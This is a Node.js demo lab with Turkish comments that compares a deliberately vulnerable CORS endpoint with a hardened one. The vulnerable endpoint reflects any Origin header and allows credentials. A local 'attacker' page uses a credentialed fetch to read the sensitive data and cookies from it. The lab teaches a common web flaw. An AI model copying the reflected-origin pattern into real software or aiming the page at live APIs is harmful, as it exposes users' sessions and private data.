const http = require("http");
const url = require("url");

// 1. API SUNUCUSU (Hedef Uygulama - Port 3017)
const apiServer = http.createServer((req, res) => {
  const parsedUrl = url.parse(req.url, true);
  const origin = req.headers["origin"] || "";
  const cookie = req.headers["cookie"] || "";

  // A. Oturum ve Çerez Test Uç Noktası
  // GET /api/set-cookies

  if (parsedUrl.pathname === "/api/set-cookies") {
    res.writeHead(200, {
      "Content-Type": "application/json",
      "Set-Cookie": [
        // 1. Host-only Çerez (Domain belirtilmemiş -> Sadece localhost:3017 için geçerli)
        "host_only_token=SECRET_HOST_ONLY; Path=/; HttpOnly; SameSite=Lax",
        // 2. Lax Çerez
        "lax_session=LAX_VAL; Path=/; HttpOnly; SameSite=Lax",
        // 3. Strict Çerez
        "strict_session=STRICT_VAL; Path=/; HttpOnly; SameSite=Strict",
      ],
    });
    return res.end(JSON.stringify({ message: "Çerezler tanımlandı." }));
  }

  // B. ZAFİYETLİ CORS UÇ NOKTASI (Origin Reflected + Credentials: true)
  // GET /api/vulnerable-data

  if (parsedUrl.pathname === "/api/vulnerable-data") {
    // KRİTİK HATA: Gelen Origin başlığı dinamik olarak kabul ediliyor
    res.writeHead(200, {
      "Content-Type": "application/json",
      "Access-Control-Allow-Origin": origin || "*",
      "Access-Control-Allow-Credentials": "true",
    });
    return res.end(
      JSON.stringify({
        sensitive_data: "CONFIDENTIAL_FINANCIAL_RECORDS",
        received_cookies: cookie,
      }),
    );
  }

  // C. SIKILAŞTIRILMIŞ CORS UÇ NOKTASI (Strict Origin Whitelist + Preflight OPTIONS)
  // OPTIONS & GET /api/hardened-data
  // Güvenli CORS politikası için izin verilen origin listesi
  const ALLOWED_ORIGINS = [
    "http://localhost:3017",
    "https://trusted.app.local",
  ];

  if (parsedUrl.pathname === "/api/hardened-data") {
    const isAllowed = ALLOWED_ORIGINS.includes(origin);

    // Preflight (OPTIONS) Yanıtı
    // Preflight isteği, tarayıcı tarafından CORS politikalarını kontrol etmek için gönderilir.
    if (req.method === "OPTIONS") {
      if (isAllowed) {
        res.writeHead(204, {
          "Access-Control-Allow-Origin": origin,
          "Access-Control-Allow-Methods": "GET, POST, OPTIONS",
          "Access-Control-Allow-Headers": "Content-Type, Authorization",
          "Access-Control-Allow-Credentials": "true",
          "Access-Control-Max-Age": "86400",
        });
      } else {
        res.writeHead(403);
      }
      return res.end();
    }

    // Normal Veri İsteği
    if (isAllowed) {
      res.writeHead(200, {
        "Content-Type": "application/json",
        "Access-Control-Allow-Origin": origin,
        "Access-Control-Allow-Credentials": "true",
      });
      return res.end(
        JSON.stringify({
          status: "SUCCESS",
          data: "AUTHORIZED_RESOURCE",
          received_cookies: cookie,
        }),
      );
    } else {
      res.writeHead(403, { "Content-Type": "application/json" });
      return res.end(
        JSON.stringify({
          error: "CORS Policy Rejection: Origin unauthorized.",
        }),
      );
    }
  }

  res.writeHead(404);
  res.end("Not Found");
});

// 2. SALDIRGAN WEB SUNUCUSU (Port 3018)
const attackerServer = http.createServer((req, res) => {
  res.writeHead(200, { "Content-Type": "text/html; charset=utf-8" });
  res.end(`
    <!DOCTYPE html>
    <html>
    <head><title>Saldırgan Sayfası (Port 3018)</title></head>
    <body>
      <h2>Cross-Origin Veri Sızdırma Testi</h2>
      <script>
        // Kurban tarayıcısından API'ye kimlik doğrulamalı (credentials: include) istek at
        fetch('http://localhost:3017/api/vulnerable-data', {
          credentials: 'include'
        })
        .then(r => r.json())
        .then(data => {
          console.log('[+] Sızdırılan Veri:', data);
        })
        .catch(err => console.error('[-] CORS Engeli:', err));
      </script>
    </body>
    </html>
  `);
});

apiServer.listen(3017, "127.0.0.1", () => {
  console.log("[+] API Sunucusu Port 3017 üzerinde hazır.");
});

attackerServer.listen(3018, "127.0.0.1", () => {
  console.log("[+] Saldırgan Web Sunucusu Port 3018 üzerinde hazır.");
});
